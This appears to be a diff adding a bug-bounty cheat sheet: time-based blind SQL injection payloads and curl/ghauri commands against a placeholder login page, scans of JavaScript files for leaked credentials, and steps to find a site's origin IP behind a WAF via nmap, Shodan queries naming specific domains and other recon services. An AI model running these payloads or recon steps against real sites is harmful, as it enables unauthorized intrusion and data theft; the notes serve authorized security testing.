@@ -1,0 +1,52 @@
+Blind SQL Injection POST Test :-
+
+'
+'--
+\
+#
+
+ghauri -u 'https://test/ff/login.php' --data "user=*&pass=test" --batch --flush-session
+
+ghauri -r r.txt --batch --level 3 --flush-session
+
+time curl -X POST -d "user='XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pass=test" https://test/ff/login.php
+
+'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+
+_________________________________________________________________________________________________
+
+JS Testing :-
+
+cat js-files.txt | jsleaks -s -l -k
+
+cat js-files.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python3 lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
+
+___________________________________________________________________________________________
+
+Origin IP :-
+
+wafw00f https://test.com
+
+nmap --script ssl-cert -p 443 192.236.193.238
+
+1- ping test.com
+
+2- dnsrecon -d test.com
+
+3- Shodan :-
+
+Ssl.cert.subject.CN:"rapfame.app" 200
+
+shodan search Ssl.cert.subject.CN:"matcha.xyz" 200 --fields ip_str | httpx -sc -title -server -td
+
+4- https://favicons.teamtailor-cdn.com -->    https://favicon-hash.kmsec.uk    -->  http.favicon.hash:1390037637      (shodan && censys)
+
+5- https://search.censys.io
+6- https://viewdns.info
+7- https://securitytrails.com
+8- https://mxtoolbox.com
+9- https://en.fofa.info
+
+
